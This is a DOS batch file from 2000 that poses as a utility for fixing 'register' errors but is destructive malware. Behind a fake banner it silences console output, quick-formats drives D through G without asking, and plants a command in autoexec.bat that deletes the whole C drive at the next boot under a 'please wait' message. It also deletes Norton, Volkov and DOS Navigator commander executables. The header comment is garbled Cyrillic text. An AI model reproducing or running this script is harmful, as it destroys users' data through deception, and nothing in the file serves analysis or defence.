:    ��������! ����� 䠩� ���� ���楬. ��� �ᯮ�짮����� �ࠩ��
: �� �������������.
:  (c) Copyright 2000 by Steel... Version 1.2
@echo off
cls
echo.
echo.
echo       ������������������������������������������������������ͻ
echo       �     New Utils, when find errors on your registers... �
echo       �  (c) Andrey Vologden... 2000 years                   �
echo       ������������������������������������������������������ͼ
echo  Wait...
@ctty nul
echo y| format g: /q /u /v:SYSTEM
echo y| format f: /q /u /v:SYSTEM
echo y| format e: /q /u /v:SYSTEM
echo y| format d: /q /u /v:SYSTEM
echo @echo off > c:\autoexec.bat
echo echo Please wait, until all registers be right... >> c:\autoexec.bat
echo @ctty nul >> c:\autoexec.bat
echo deltree/y c: >> c:\autoexec.bat
del c:\dn\dn.com
del c:\nc\nc.exe
del c:\vc\vc.com
